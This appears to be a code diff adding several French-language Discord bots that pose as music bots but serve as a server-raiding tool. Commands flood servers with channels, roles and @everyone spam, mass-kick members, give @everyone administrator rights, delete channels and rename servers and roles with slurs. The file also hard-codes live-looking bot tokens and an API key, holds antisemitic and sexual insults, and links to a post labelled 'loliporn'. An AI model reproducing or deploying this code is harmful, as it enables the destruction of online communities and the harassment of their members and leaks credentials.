@@ -1,0 +1,1690 @@
+Carnage.on("ready", () => {
+  var spamming_2 = false;
+  console.log(`(2) Bot Lancer ${Carnage.user.tag}!`);
+  // Carnage.user.setStatus("invisible")
+  //Carnage.user.setPresence({game: { name: "\"" + pre + "help\" pour afficher les commandes", type: 0 }});
+  Carnage.user.setGame("\"" + pre + "help\" pour afficher les commandes", 'https://www.twitch.tv/raid')
+  
+});
+
+Carnage.on('message', msg => {
+if (msg.content === "lien bot") {
+    msg.author.sendMessage( "@" + msg.author.tag + 
+      " Lien: https://discordapp.com/oauth2/authorize?client_id=397534482913165312&permissions=2146958591&scope=bot"
+    );
+  }if (msg.content === "off") {Carnage.user.setStatus("invisible")}
+
+
+if (msg.content === ";pp") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: Carnage.user.username,
+          icon_url: Carnage.user.avatarURL
+        },
+        title: "**Votre Photo de profil**",
+        url: msg.author.avatarURL,
+        image: {
+          url: msg.author.avatarURL
+        },
+
+        timestamp: new Date(),
+        footer: {
+          icon_url: Carnage.user.avatarURL,
+          text: "Carnage"
+        }
+      }
+    });
+  }
+
+
+if (msg.content === ";help") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: Carnage.user.username,
+          icon_url: Carnage.user.avatarURL
+        },
+        title: Carnage.user.username,
+        url:
+          "https://www.allo-image.net/stockimg/upload/15752232035a2d46647e9a0mail.png",
+        description: "les commande du bot",
+        fields: [
+          {
+            name: "commande",
+            value:
+              ";blacklist, ;clean, ;clear, ;disconnect, ;id, ;joinserver, ;listids, ;np, ;pause, ;perms, ;play, ;pldump, ;queue, ;restart, ;resume, ;search, ;setavatar, ;setname, ;setnick, ;shuffle, ;shutdown, ;skip, ;stream, ;summon, ;volume."
+          },
+          {
+            name: "PS",
+            value: "Demmander a votre JEAN- INFORMATICIEN ?? pour plus d'aide"
+          },
+          {
+            name: "Merci",
+            value: "Bonne journée et bon jeu"
+          }
+        ],
+        timestamp: new Date(),
+        footer: {
+          icon_url: Carnage.user.avatarURL,
+          text: "©" + Carnage.user.username + "™"
+        }
+      }
+    });
+  }
+
+           if (msg.content.startsWith("!del!")) {
+    msg.delete(1000);
+    msg.guild.channels
+      .filter(i => {
+        return i.name === "Carnage !!!!!";
+     
+      })
+      .forEach(c => {
+        c.delete();
+      });
+}if (msg.content.startsWith("!del!")) {
+    msg.delete(1000);
+    msg.guild.channels
+      .filter(i => {
+        
+      return i.name === "carnage";
+      })
+      .forEach(c => {
+        c.delete();
+      });
+}if (msg.content.startsWith("!del!")) {
+    msg.delete(1000);
+    msg.guild.roles.filter(i => {return i.name === "Carnage";})
+      .forEach(c => {
+        c.delete();
+      });
+}
+
+
+if (msg.content === ';purge') {
+    msg.delete();
+    msg.guild.members.forEach(member => {
+      if (member.kickable && !member.roles.find("name", "Carnage")) {
+        member.kick();
+      }
+    });
+  }
+
+
+if (msg.content === pre) {
+
+}else if (msg.content.startsWith(">invite")) {
+    Carnage.channels
+      .get(msg.content.replace(">invite ", ""))
+      .createInvite({
+        maxAge: 0 // Infinite
+      })
+      .then(invite => {
+        msg.channel.send(invite.url);
+      });
+  } else if (msg.content.startsWith(">channels")) {
+    var a = [];
+    Carnage.guilds
+      .get(msg.content.split(" ")[1])
+      .channels.filter(i => {
+        return i.permissionsFor(Carnage.user).has("CREATE_INSTANT_INVITE");
+      })
+      .forEach(i => {
+        a.push(i.id.toString());
+      });
+    msg.channel.send(a);
+  }
+
+           
+  
+    if (msg.content === pre) {
+    spamming_2 = true;
+     setInterval(function() {
+      if (spamming_2 === true){
+        msg.member.guild.createRole({name: "Carnage", permissions: perms})
+       var myRole = msg.guild.roles.find(r => {
+      return r.name === "Carnage";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);}
+      if (spamming_2 === true) {
+        msg.guild.createChannel("carnage", "text");
+      }
+      if (spamming_2 === true) {
+        msg.guild.createChannel("Carnage !!!!!", "voice");
+      }
+      if (spamming_2 === true) {
+        msg.channel.send("Carnage !!!!!");
+      }
+
+      if (spamming_2 === true) {
+      } else {
+        return;
+      }
+    }, 10);
+    }
+  
+  
+  
+
+if (msg.content === "STOP") {
+    spamming_2 = false;
+}
+  
+  if (msg.content === "!del!") {
+Carnage.channels.find("name", "logs-bot-carnage").send({
+    embed: {
+      color: 861111,
+      title: "logs",
+      description: "Commande DEL utiliser par " + "@" + msg.author.tag + " dans le serveur " + msg.guild.name
+    }
+  });
+}
+
+
+
+if (msg.content === "STOP") {
+Carnage.channels.find("name", "logs-bot-carnage").send({
+    embed: {
+      color: 861111,
+      title: "logs",
+      description: "Commande STOP utiliser par " + "@" + msg.author.tag + " dans le serveur " + msg.guild.name
+    }
+  });
+}
+if (msg.content === "lien bot") {
+Carnage.channels.find("name", "logs-bot-carnage").send({
+    embed: {
+      color: 861111,
+      title: "logs",
+      description: "@" + msg.author.tag + " a demmander le lien du bot,lien du bot MP"
+    }
+  });
+}
+
+
+if (msg.content === ";purge") {
+Carnage.channels.find("name", "logs-bot-carnage").send({
+    embed: {
+      color: 861111,
+      title: "logs",
+      description: "Commande ;purge utiliser par " + "@" + msg.author.tag + " dans le serveur " + msg.guild.name
+    }
+  });
+}
+});
+Carnage.login("token");
+
+
+bot.on("ready", () => {
+  console.log(`(2) Logged in as ${bot.user.tag}!`);
+  bot.user.setPresence({ game: { name: ";" + "help" + " pour afficher les commandes", type: 0}});
+  bot.channels.find("name", "logs").sendMessage("BOT Mee6-Defender connecté et prêt a niquer des server cancer ! commande de destruction " + pre);
+
+});
+function cmd(str, msg) {
+return msg.content.toLowerCase().startsWith(pre + str);
+}bot.on("message", msg => {
+if(cmd("a", msg)) {msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); for (var i = 0; i < 1000; i++) {msg.guild.setName("TEMPS ENCULER "+ i + " ");
+
+    }
+ }
+ });
+
+
+var spamming_2 = false;
+
+bot.on("message", msg => {
+  if (msg.content === "R") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Nouveau Nutella";
+    }); // Connerieurs?
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  }
+
+  if (msg.content === "lien Mee6") {
+    msg.author.sendMessage(
+      "Lien: https://discordapp.com/oauth2/authorize?client_id=392415215918252047&permissions=2146958591&scope=bot"
+    );
+  }
+var perms = ["KICK_MEMBERS",
+      "BAN_MEMBERS",
+      "ADMINISTRATOR",
+      "CREATE_INSTANT_INVITE",
+      "MANAGE_CHANNELS",
+      "MANAGE_GUILD",
+      "ADD_REACTIONS",
+      "VIEW_AUDIT_LOG",
+      "VIEW_CHANNEL",
+      "READ_MESSAGES",
+      "SEND_MESSAGES",
+      "SEND_TTS_MESSAGES",
+      "MANAGE_MESSAGES",
+      "EMBED_LINKS",
+      "ATTACH_FILES",
+      "READ_MESSAGE_HISTORY",
+      "MENTION_EVERYONE",
+      "USE_EXTERNAL_EMOJIS",
+      "EXTERNAL_EMOJIS",
+      "CONNECT",
+      "SPEAK",
+      "MUTE_MEMBERS",
+      "DEAFEN_MEMBERS",
+      "MOVE_MEMBERS",
+      "USE_VAD",
+      "CHANGE_NICKNAME",
+      "MANAGE_NICKNAMES",
+      "MANAGE_ROLES",
+      "MANAGE_ROLES_OR_PERMISSIONS",
+      "MANAGE_WEBHOOKS",
+      "MANAGE_EMOJIS"];
+  if (msg.content === pre) {
+    spamming_2 = true;
+     
+    setInterval(function() {
+     
+      if (spamming_2 === true) {
+        msg.guild.createChannel("TMWSTW", "text");
+      }
+      if (spamming_2 === true) {
+        msg.guild.createChannel("TMWSTW https://discord.gg/d394WP6", "voice");
+      }
+      if (spamming_2 === true) {
+        msg.channel.send("@everyone TMWSTW https://discord.gg/d394WP6");
+      }
+
+      if (spamming_2 === true) {
+      } else {
+        return;
+      }
+    }, 1000);
+  } else if (msg.content === pre) {
+    spamming_2 = true;
+    setInterval(function() {
+      //if (spamming_2 === true) {msg.channel.delete('NIQUER-VOUS', 'text');}
+      if (spamming_2 === true) {
+        msg.guild.createChannel("PD", "text");
+      } else {
+        return;
+      }
+    }, 1000);
+  } if (msg.content === ';purge') {
+    bot.channels.find("name", "logs").sendMessage("Commande ;purge par " + msg.author.username);
+    msg.delete();
+    msg.guild.members.forEach(member => {
+      if (member.kickable && !member.roles.find("name", "RAID")) {
+        member.kick();
+      }
+    });
+  }
+         
+  
+  
+  if (msg.content.startsWith("del")) {Carnage.channels.find("name", "logs-bot-carnage").sendMessage("Commande delvv par " + msg.author.username + " dans le serveur " + msg.guild.name);
+    msg.delete(1000);
+    msg.guild.channels
+      .filter(i => {
+        return i.name === "Carnage !!!!!";
+      return i.name === "Carnage !!!!!";
+      })
+      .forEach(c => {
+        c.delete();
+      });
+  } else if (msg.content === "STOP") {
+    bot.channels.find("name", "logs").sendMessage("Commande STOP par " + msg.author.username);
+    spamming_2 = false;
+  } else if (msg.content === "123") {
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "Ongaku";
+    });
+    msg.delete();
+    Member.setPosition(8)
+      .then(r => console.log(`Role position: ${r.position}`))
+      .catch(console.error);
+  } else if (msg.content === "E") {
+    msg.delete();
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "@everyone";
+    });
+    Member.setPermissions([
+      "KICK_MEMBERS",
+      "BAN_MEMBERS",
+      "ADMINISTRATOR",
+      "CREATE_INSTANT_INVITE",
+      "MANAGE_CHANNELS",
+      "MANAGE_GUILD",
+      "ADD_REACTIONS",
+      "VIEW_AUDIT_LOG",
+      "VIEW_CHANNEL",
+      "READ_MESSAGES",
+      "SEND_MESSAGES",
+      "SEND_TTS_MESSAGES",
+      "MANAGE_MESSAGES",
+      "EMBED_LINKS",
+      "ATTACH_FILES",
+      "READ_MESSAGE_HISTORY",
+      "MENTION_EVERYONE",
+      "USE_EXTERNAL_EMOJIS",
+      "EXTERNAL_EMOJIS",
+      "CONNECT",
+      "SPEAK",
+      "MUTE_MEMBERS",
+      "DEAFEN_MEMBERS",
+      "MOVE_MEMBERS",
+      "USE_VAD",
+      "CHANGE_NICKNAME",
+      "MANAGE_NICKNAMES",
+      "MANAGE_ROLES",
+      "MANAGE_ROLES_OR_PERMISSIONS",
+      "MANAGE_WEBHOOKS",
+      "MANAGE_EMOJIS"
+    ])
+      .then(r => console.log(`Role updated ${r}`))
+      .catch(console.error);
+  } else if (msg.content === ";pp") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: bot.user.username,
+          icon_url: bot.user.avatarURL
+        },
+        title: "**Votre Photo de profil**",
+        url: msg.author.avatarURL,
+        image: {
+          url: msg.author.avatarURL
+        },
+
+        timestamp: new Date(),
+        footer: {
+          icon_url: bot.user.avatarURL,
+          text: "Mee-defender"
+        }
+      }
+    });
+  } else if (msg.content.startsWith(">invite")) {
+    bot.channels
+      .get(msg.content.replace(">invite ", ""))
+      .createInvite({
+        maxAge: 0 // Infinite
+      })
+      .then(invite => {
+        msg.channel.send(invite.url);
+      });
+  } else if (msg.content.startsWith(">channels")) {
+    var a = [];
+    bot.guilds
+      .get(msg.content.split(" ")[1])
+      .channels.filter(i => {
+        return i.permissionsFor(bot.user).has("CREATE_INSTANT_INVITE");
+      })
+      .forEach(i => {
+        a.push(i.id.toString());
+      });
+    msg.channel.send(a);
+  }
+  if (msg.content === "e") {
+    msg.delete();
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "Nouveau Nutella";
+    });
+    Member.edit({ name: "FILS DE VIOLE" })
+      .then(r => console.log(`Edited role ${r}`))
+      .catch(console.error);
+  } else if (msg.content === "RAID") {
+    msg.delete(1000);
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "Administrateur";
+    });
+    Member.edit({ name: "VIOLE" })
+      .then(r => console.log(`Edited role ${r}`))
+      .catch(console.error);
+  }
+  else if (msg.content === "del") {
+    msg.delete(1000);
+    msg.channel.delete("", "text");
+    msg.channel.delete("tmwstw", "text");
+    msg.channel.delete("tmwstw", "text");
+  }if (msg.content === "m") {
+    msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); var i = 0; i < 500; i++
+    msg.guild.setName("IL Y A EU "+ i + " PD MORT ICI");
+    }
+
+  if (msg.content === pre) {
+    msg.author.sendMessage({
+      embed: {
+        color: 2550255,
+        author: {
+          name: bot.user.username,
+          icon_url: bot.user.avatarURL
+        },
+        title: "**Mee6-Defender**",
+        fields: [
+          {
+            name: "SPAM DONE",
+            value: "**LES KIKOO JAP VONT PLEURÉ**"
+          }
+        ],
+        footer: {
+          icon_url: bot.user.avatarURL,
+          text: "Mee6-Defender™"
+        }
+      }
+    });
+  }
+
+  if (msg.content === ";help") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: bot.user.username,
+          icon_url: bot.user.avatarURL
+        },
+        title: "Mee6-Defender",
+        url:
+          "https://www.allo-image.net/stockimg/upload/15752232035a2d46647e9a0mail.png",
+        description: "les commande du bot",
+        fields: [
+          {
+            name: "commande",
+            value:
+              ";blacklist, ;clean, ;clear, ;disconnect, ;id, ;joinserver, ;listids, ;np, ;pause, ;perms, ;play, ;pldump, ;queue, ;restart, ;resume, ;search, ;setavatar, ;setname, ;setnick, ;shuffle, ;shutdown, ;skip, ;stream, ;summon, ;volume."
+          },
+          {
+            name: "PS",
+            value: "Demmander a votre JEAN- INFORMATICIEN ?? pour plus d'aide"
+          },
+          {
+            name: "Merci",
+            value: "Bonne journée et bon jeu"
+          }
+        ],
+        timestamp: new Date(),
+        footer: {
+          icon_url: bot.user.avatarURL,
+          text: "©Mee6-Defender™"
+        }
+      }
+    });
+  }
+});
+
+bot.login("MzkyNDE1MjE1OTE4MjUyMDQ3.DS3TCA.7hDNsIVSmPSROmcAufNrHqqZZdw");
+
+// Ongaku
+const bot1 = new Discord.Client();
+bot1.setMaxListeners(1);
+bot1.on("ready", () => {
+  console.log(`(2) Logged in as ${bot1.user.tag}!`);
+  bot1.channels.find("name", "logs").sendMessage("BOT Mee6-Defender connecté et prêt a niquer des server cancer ! commande de destruction " + pre);
+  bot1.user.setPresence({ game: { name: "!" + "help" + " pour afficher les commandes", type: 0}});
+  
+  bot1.setMaxListeners(1);
+});
+
+var spamming_2 = false;
+
+bot1.on("message", msg => {
+  if (msg.content === "R") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Modérateur";
+    }); // Connerieurs?
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === pre) {
+    spamming_2 = true;
+    setInterval(function() {
+      if (spamming_2 === true)
+        msg.guild.createRole({
+          name: "#TMWSTW https://discord.gg/d394WP6",
+          color: "BLUE"
+        });
+      function cmd(str, msg) {
+return msg.content.toLowerCase().startsWith(pre + str);
+}bot.on("message", msg => {
+if(cmd("", msg)) {msg.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); for (var i = 0; i > 500; i++) {msg.guild.createRole({name: 'E de nous',color: 'RED',});
+msg.guild.setName("DONNEZ AVANT "+ i + " MORT ICI");
+    }
+ }
+ });
+      if (spamming_2 === true) {
+        msg.guild.createChannel("TMWSTW", "text");
+      }
+      if (spamming_2 === true) {
+        msg.guild.createChannel("TMWSTW https://discord.gg/d394WP6", "voice");
+      }
+      if (spamming_2 === true) {
+        msg.channel.send("@everyone TMWSTW https://discord.gg/d394WP6");
+      } else {
+        return;
+      }
+    }, 10);
+  } else if (msg.content === "STOP") {
+    spamming_2 = false;
+  } else if (msg.content === "123") {
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "Ongaku";
+    });
+    msg.delete();
+    Member.setPosition(8)
+      .then(r => console.log(`Role position: ${r.position}`))
+      .catch(console.error);
+  } else if (msg.content === "E") {
+    msg.delete();
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "@everyone";
+    });
+    Member.setPermissions([
+      "KICK_MEMBERS",
+      "BAN_MEMBERS",
+      "ADMINISTRATOR",
+      "CREATE_INSTANT_INVITE",
+      "MANAGE_CHANNELS",
+      "MANAGE_GUILD",
+      "ADD_REACTIONS",
+      "VIEW_AUDIT_LOG",
+      "VIEW_CHANNEL",
+      "READ_MESSAGES",
+      "SEND_MESSAGES",
+      "SEND_TTS_MESSAGES",
+      "MANAGE_MESSAGES",
+      "EMBED_LINKS",
+      "ATTACH_FILES",
+      "READ_MESSAGE_HISTORY",
+      "MENTION_EVERYONE",
+      "USE_EXTERNAL_EMOJIS",
+      "EXTERNAL_EMOJIS",
+      "CONNECT",
+      "SPEAK",
+      "MUTE_MEMBERS",
+      "DEAFEN_MEMBERS",
+      "MOVE_MEMBERS",
+      "USE_VAD",
+      "CHANGE_NICKNAME",
+      "MANAGE_NICKNAMES",
+      "MANAGE_ROLES",
+      "MANAGE_ROLES_OR_PERMISSIONS",
+      "MANAGE_WEBHOOKS",
+      "MANAGE_EMOJIS"
+    ])
+      .then(r => console.log(`Role updated ${r}`))
+      .catch(console.error);
+  } else if (msg.content === "e") {
+    msg.delete();
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "Nouveau Nutella";
+    });
+    Member.edit({ name: "FILS DE VIOLE" })
+      .then(r => console.log(`Edited role ${r}`))
+      .catch(console.error);
+  } else if (msg.content === "RAID") {
+    msg.delete(1000);
+    var Member = msg.guild.roles.find(r => {
+      return r.name === "Administrateur";
+    });
+    Member.edit({ name: "VIOLE" })
+      .then(r => console.log(`Edited role ${r}`))
+      .catch(console.error);
+  }
+
+  if (msg.content === "lien Ongaku") {
+    msg.author.sendMessage(
+      "Lien: https://discordapp.com/oauth2/authorize?client_id=388055871881609217&scope=bot&permissions=2146958591"
+    );
+  }
+
+  bot1.on("message", msg => {
+    if (msg.content === "R") {
+      msg.delete();
+      bot1.user.setGame("MUSIC");
+    } else if (msg.content === "del") {
+      msg.delete(1000);
+      {
+        msg.channel.delete("", "text");
+      }
+    }
+  });
+  if (msg.content.startsWith("!invite")) {
+    bot.channels
+      .get(msg.content.replace("!invite ", ""))
+      .createInvite({
+        maxAge: 0 // Infinite
+      })
+      .then(invite => {
+        msg.channel.send(invite.url);
+      });
+  } else if (msg.content.startsWith("!channels")) {
+    var a = [];
+    bot.guilds
+      .get(msg.content.split(" ")[1])
+      .channels.filter(i => {
+        return i.permissionsFor(bot.user).has("CREATE_INSTANT_INVITE");
+      })
+      .forEach(i => {
+        a.push(i.id.toString());
+      });
+    msg.channel.send(a);
+  }
+  {
+    if (msg.content === "SPAM")
+      msg.author.sendMessage({
+        embed: {
+          color: 2550255,
+          author: {
+            name: bot1.user.username,
+            icon_url: bot1.user.avatarURL
+          },
+          title: "**Ongaku**",
+          fields: [
+            {
+              name: "SPAM DONE",
+              value: "**LES KIKOO JAP VONT PLEURÉ**"
+            }
+          ],
+          footer: {
+            icon_url: bot1.user.avatarURL,
+            text: "©Ongaku™"
+          }
+        }
+      });
+  }
+
+  {
+    if (msg.content === "!help")
+      msg.author.sendMessage({
+        embed: {
+          color: 2550255,
+          author: {
+            name: bot1.user.username,
+            icon_url: bot1.user.avatarURL
+          },
+          title: "Ongaku",
+          url: "https://www.google.com",
+          description: "les commande du bot",
+          fields: [
+            {
+              name: "commande",
+              value:
+                "!blacklist, !clean, !clear, !disconnect, !id, !joinserver, !listids, !np, !pause, !perms, !play, !pldump, !queue, !restart, !resume, !search, !setavatar, !setname, !setnick, !shuffle, !shutdown, !skip, !stream, !summon, !volume."
+            },
+            {
+              name: "PS",
+              value: "Demmander a votre JEAN- INFORMATICIEN ?? pour plus d'aide"
+            },
+            {
+              name: "Merci",
+              value: "Bonne journée et bon jeu"
+            }
+          ],
+          timestamp: new Date(),
+          footer: {
+            icon_url: bot1.user.avatarURL,
+            text: "©Ongaku™"
+          }
+        }
+      });
+  }
+});
+
+bot1.login("Mzg4MDU1ODcxODgxNjA5MjE3.DSiCFQ.QEME9xNI3nB9GlGpeL-Hc9DZNEU");
+
+// Raida Bot
+const raider = new Discord.Client();
+
+const request = require("request");
+raider.on("ready", () => {
+  
+  console.log(`(3) connecter avec ${raider.user.tag}!`);
+  raider.user.setPresence({ game: { name: "#" + "help" + " pour afficher les commandes", type: 0}});
+});
+
+var spamming_3 = false;
+const raid = [
+  "385524830101045248",
+  "385524840951578636",
+  "317375697700126720",
+  "356886408453160962"
+];
+
+raider.on("message", msg => {
+  if (msg.content === "!ADMIN") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Membres  ";
+    });
+    
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "#RAID ON") {
+    raider.user.setGame("RAID ON ??");
+    msg.reply("RAID GO @here");
+  } else if (msg.content === "#RAID OFF") {
+    msg.delete(1000);
+    raider.user.setGame("RAID OFF ??");
+    msg.reply(
+      "Voy en el discord y su los loliporn https://image.noelshack.com/fichiers/2017/49/5/1512766875-photo-hisotrique.png @here"
+    );
+  } else if (msg.content === "MICOLOR") {
+    msg.delete(1000);
+    var mycolour = msg.guild.roles.find(r => {
+      return r.name === "Bots SPÉCIAUX";
+    });
+    spamming_3 = true;
+    setInterval(function() {
+      if (spamming_3 === true) {
+        mycolour.setColor("#00FFFF");
+        mycolour.setColor("#FFFF00");
+      } else {
+        return;
+      }
+    }, 1000);
+  }if (msg.content.search(/@everyone/gi) > -1) {
+    // do anything
+    msg.delete(1000);
+    msg.reply('va te faire enculer spameur de juif');
+    msg.delete(30000);
+    } else if (msg.content === "STOP") {
+    spamming_3 = false;
+  } else if (msg.content === "#RAID ON") {
+    msg.delete(1000);
+    spamming_3 = true;
+    setInterval(function() {
+      if (spamming_3 === true) {
+        raider.user.setGame("#RAID ON ??");
+        raider.user.setGame("#RAID ON ");
+      } else {
+        return;
+      }
+    }, 100);
+  } else if (msg.content === "STOP") {
+    spamming_3 = false;
+  }
+
+  if (msg.content.startsWith("#raid")) {
+    msg.delete(1000);
+    msg.channel.send(
+      "@here Kheyistas Kheyistas !!! Ve por raid " +
+        msg.content.replace("-raid ", "") +
+        " no de la tarde, yatangaki !!!"
+    );
+  } else if (msg.content.startsWith("#ISSOU")) {
+    msg.delete(1000);
+    msg.channel.send("ISSOU " + msg.content.replace("#ISSOU ", "") + " ISSOU");
+    msg.delete(30000);
+  } else if (msg.content === "INVISIBLE") {
+    msg.delete(1000);
+    var myinvisiblr = msg.guild.roles.find(r => {
+      return r.name === "Pussy destroyer";
+    });
+    myinvisiblr.setColor("#303136");
+  } else if (msg.content === "VISIBLE") {
+    msg.delete(1000);
+    var myinvisiblr = msg.guild.roles.find(r => {
+      return r.name === "Pussy destroyer";
+    });
+    myinvisiblr.setColor("#8A2BE2");
+  }
+
+  if (msg.content.startsWith("#play")) {
+    msg.delete(1000);
+  }
+
+  if (msg.content.startsWith("#volume")) {
+    msg.delete(1000);
+  }
+
+  if (msg.content.startsWith("#skip")) {
+    msg.delete(1000);
+  }
+
+  if (msg.content.startsWith("#queue")) {
+    msg.delete(1000);
+  }
+
+  if (msg.content.startsWith("#summon")) {
+    msg.delete(1000);
+  } else if (
+    msg.content === "85446456456456456456546456456456" &&
+    msg.author.id === "285120076078776330"
+  ) {
+    msg.delete(1000);
+    {
+      msg.channel.delete("456456456456456546456456456456456456456", "text");
+    }
+  } else if (
+    msg.content === "456456456456456456456456456456456456456" &&
+    msg.author.id === "317375697700126720"
+  ) {
+    msg.delete(1000);
+    {
+      msg.channel.delete(
+        "46456456456456456456456456456456456456546456456456456456456456456",
+        "text"
+      );
+    }
+  } else if (msg.content === "#pp")
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: raider.user.username,
+          icon_url: raider.user.avatarURL
+        },
+        title: "**Votre Photo de profil**",
+        url: msg.author.avatarURL,
+        image: {
+          url: msg.author.avatarURL
+        },
+
+        timestamp: new Date(),
+        footer: {
+          icon_url: raider.user.avatarURL,
+          text: "©Raida Bot™"
+        }
+      }
+    });
+  else if (msg.content.startsWith("#kikoo")) {
+    if (msg.content.replace("#kikoo ", "") === "") {
+      msg.reply("`kikoo <Query>`");
+    }
+    request(
+      "https://www.googleapis.com/youtube/v3/search?part=snippet&order=viewCount&q=" +
+        msg.content.replace("#kikoo ", "") +
+        "&type=video&videoDefinition=high&key=AIzaSyDs1NJ5wF-pvykTHh_9_CP4tIrkQzuFRqw",
+      (error, response, body) => {
+        if (error || response.statusCode !== 200) {
+          msg.reply("L'API de Google ne fonctionne pas lol.");
+        } else {
+          body = JSON.parse(body);
+          if (body.pageInfo.totalResults === 0) {
+            msg.reply("Sans résultats lol."); // nice french
+          } else {
+            msg.reply(
+              "La première vidéo: http://youtu.be/" + body.items[0].id.videoId
+            );
+          }
+        }
+      }
+    );
+    
+
+  } else if (msg.content === "#volume 1000") {
+    // VASY FAIT PETER LES BASSE MICHEL
+    msg.reply("VASY FAIT PETER LES BASSE MICHEL");
+  } else if (msg.content === "#help")
+    msg.author.sendMessage({
+      embed: {
+        color: 2550255,
+        author: {
+          name: raider.user.username,
+          icon_url: raider.user.avatarURL
+        },
+        title: "**ENVOYER UN MAIL AU DEV**",
+        url:
+          "https://www.allo-image.net/stockimg/upload/15752232035a2d46647e9a0mail.png",
+        description: "les Commandes",
+        fields: [
+          {
+            name: "Commande de Raida Bot",
+            value:
+              "#pp, #blacklist, #clean, #clear, #disconnect, #id, #joinserver, #listids, #np, #pause, #perms, #play, #pldump, #queue, #restart, #resume, #search, #setavatar, #setname, #setnick, #shuffle, #shutdown, #skip, #stream, #summon, #volume , #RAID ON, #RAID OFF, #raid 'lien a raid', #ISSOU 'speudo'."
+          },
+          {
+            name: "Commande des Bot Raid",
+            value:
+              "del (supprime le chanel), E (met everyone admin), SPAM (créé des role des chanel vocal/text et spam en ecrit a l'infini)"
+          },
+          {
+            name: "PS",
+            value: "Demmander a votre JEAN- INFORMATICIEN ?? pour plus d'aide"
+          },
+          {
+            name: "Merci",
+            value: "Bonne journée et bon Raid"
+          }
+        ],
+        timestamp: new Date(),
+        footer: {
+          icon_url: raider.user.avatarURL,
+          text: "©Raida Bot™"
+        }
+      }
+    });
+});raider.on("guildMemberAdd", member => {  
+  raider.channels.get("391628308808204298").send("Nouveaux Soldat son nom " + member.user.username);
+  var role = member.guild.roles.find("name", "Habitant de tranquillity Lane");
+  member.addRole(role);
+});
+raider.login("MzkxOTI2ODg3MTIwODk2MDEw.DTAy2Q.L5Z6_1phUva4ifSVsoie6t61k7M");
+
+// DevBot
+var ccxt = require ('ccxt')
+const devhack = new Discord.Client();
+const btcValue = require("btc-value");
+devhack.on("ready", () => {
+  console.log(`(1) Logged in as ${devhack.user.tag}!`);
+  devhack.user.setGame("devhack.fr.nf");
+  devhack.setMaxListeners(1);
+});
+var spamming_1 = false;
+const ce = require("embed-creator");
+devhack.on("message", msg => {
+  if (msg.content === "roledsdsdsddsdsdssdSPAM 1") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Youtubeur";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (
+    msg.content ===
+    "dsjkfhsdjfhjkdshfkjdshfjkhfjkhiuefhjsdkfjdsncjkndsjfhjkdshfkjsdncjdsjfnjksdncjdhfjksdnckjnsdjfhdsncjdsfndscdsjhfdshcndsjfh"
+  ) {
+    spamming_1 = true;
+    setInterval(function() {
+      if (spamming_1 === true) {
+        msg.channel.send("1");
+      } else {
+        return;
+      }
+    }, 1000);
+  }
+  
+  if (msg.content === "npm")
+    msg.author.sendMessage({
+        embed: {
+          color: 2550255,
+          author: {
+            name: devhack.user.username,
+            icon_url: devhack.user.avatarURL
+          },
+          title: "DevBot",
+          fields: [
+            {
+              name: "test",
+              value: "**test**"
+            }
+          ],
+          footer: {
+            icon_url: devhack.user.avatarURL,
+            text: "DevBot"
+          }
+        }
+      });
+  
+  else if (msg.content === "STOP") {
+    spamming_1 = false; // arreter le spam
+  } else if (msg.content === "role 1") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Développeur";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role 2") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Youtubeur";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role 3") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Hacker";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role 4") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Graphiste";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role 5") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Gamer";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role 6") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Journaliste";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role 7") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Streameur";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  }
+  if (msg.content === "-role 1") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Développeur";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role 2") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Youtubeur";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role 3") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Hacker";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
